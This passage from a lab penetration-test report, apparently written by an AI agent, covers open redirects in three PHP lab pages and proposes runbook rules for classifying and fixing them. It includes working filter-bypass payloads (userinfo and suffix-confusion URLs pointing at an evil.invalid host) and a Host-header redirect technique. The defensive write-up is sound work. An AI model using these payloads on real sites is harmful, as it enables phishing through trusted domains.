/laboratorio2/redirect.php?url=https://www.google.com.evil.invalid/ -> 302  Location: https://www.google.com.evil.invalid/
/laboratorio3/redirect.php?url=http://google.com.evil.invalid/      -> 302  Location: http://google.com.evil.invalid/
```

Source-level confirmation that the container is back to shipped content:

```
e9724183e2c6a1ad74febd02c52b0a8a  /var/www/html/laboratorio1/redirect.php
a454d63d28c97badd24b4250433614a2  /var/www/html/laboratorio2/redirect.php
2a6851068095aa6467deba37287b0a09  /var/www/html/laboratorio3/redirect.php
-rw-r--r-- 1 balu balu 25 Dec 26  2024 /secret.bak
/tmp marker: NONE - clean          <- my artefact is gone with the old container
id -> uid=0(root)                   <- container-level exec identity
sshd listener: present
```

Note that the vulnerabilities **reproduce on the freshly created container**, which is the
correct outcome: they are inherent to the shipped source, not artefacts of my session. That
is itself the restore check — a restored lab should still be exploitable, or the restore
was wrong.

---

## Feed-forward candidate (for the parent — RUNBOOK §5 / §10)

Open redirect is a **new class**; the row does not exist in `RUNBOOK.md` §5 and there is no
`corpus/98` precedent. A rule that would generalise past this lab, in the RUNBOOK's
question/discriminator format:

> | **Open redirect** | Does a request-supplied value reach a `Location` header such that the `Location`'s **origin** is not fixed by the server? | Name the **provenance** of the destination, not its value. Four discriminators: (1) arbitrary external origin vs a closed server-side set; (2) **who decides** — user-supplied *path* (CWE-601) vs user-supplied *origin* via a request header (CWE-644→601, the worse bug); (3) is the `Location` **unparameterised**, i.e. a header-injection primitive whose exploitability the runtime, not the app, decides; (4) **what consumes it** — OAuth `redirect_uri`, password reset, pre-filled credentials, or a session. |

And the calibration that makes (4) actionable, which this lab is a clean specimen of because
the chain is *absent* rather than unfound:

> **An open redirect with no consumer is a phishing enabler and nothing more** —
> `C:N/I:N/A:N`, `UI:R`, `PR:N`. Its lure lives on the target's own origin, so pre-click
> inspection passes, and the attacker needs no infrastructure on the critical path. Report it
> at that severity and do not inflate it. Severity is a property of the redirect **plus its
> consumer**; a report that does not ask what consumes the redirect has filed half a
> finding and cannot tell which half.

Two subsidiary rules this lab paid for, worth carrying:

- **A filter's existence is not a control.** Labs 2 and 3 both filter, both filters fire on
  the allowlisted value, and both are bypassed — by different payloads. A prefix test
  (`strpos(...) === 0`) is defeated by userinfo (`https://www.google.com@evil.invalid/`) and
  by suffix confusion (`https://www.google.com.evil.invalid/`); a host-substring test
  (`strpos(...) !== false`) is defeated by `google.com.evil.invalid`. Never `strpos` a URL or
  a hostname — `parse_url` then compare `scheme` and `host` for exact equality, and reject
  any userinfo component.
- **Ask "who built this `Location`?" for every redirect you find, including the ones with no
  parameter.** `ServerName` commented out in a `VirtualHost` with `UseCanonicalName` at its
  `Off` default made every directory in the docroot a redirector driven by the `Host`
  header — a finding that a search for `?url=` parameters would not have produced, and that
  would survive fixing all three PHP handlers.

**Instrumentation defect to add to `method/self-corrections.md`:** a shared `/tmp` scratch
directory deleted by a concurrent process makes every byte count in a batch read as blank,
and a blank count is indistinguishable from a real zero. State it as: *a missing or blank
count is untested, not zero* — and confirm the scratch path still exists before trusting a
batch that depends on it.
